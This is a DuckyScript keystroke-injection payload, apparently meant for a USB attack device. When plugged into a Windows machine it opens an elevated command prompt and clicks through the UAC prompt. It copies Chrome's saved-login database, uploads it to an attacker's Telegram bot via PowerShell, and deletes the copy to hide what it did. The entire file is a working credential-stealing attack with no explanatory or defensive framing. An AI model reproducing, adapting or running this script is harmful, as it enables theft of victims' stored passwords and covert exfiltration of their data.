
DELAY 1000
GUI r
DELAY 500
STRING powershell Start-Process cmd -Verb runAs
ENTER
DELAY 1000
ALT y
DELAY 1000
STRING copy "%LocalAppData%\Google\Chrome\User Data\Default\Login Data" "%UserProfile%\Desktop\chrome_passwords.txt"
ENTER
DELAY 1000
STRING powershell
ENTER
DELAY 1000
STRING $BotToken = 'YOUR_BOT_TOKEN'
ENTER
STRING $ChatID = 'YOUR_CHAT_ID'
ENTER
STRING $FilePath = "$env:UserProfile\Desktop\chrome_passwords.txt"
ENTER
STRING $URL = "https://api.telegram.org/bot$BotToken/sendDocument"
ENTER
STRING Invoke-RestMethod -Uri $URL -Method Post -Form @{chat_id=$ChatID; document=Get-Item $FilePath}
ENTER
DELAY 5000
STRING Remove-Item -Path $FilePath
ENTER
STRING exit
ENTER
STRING exit
ENTER
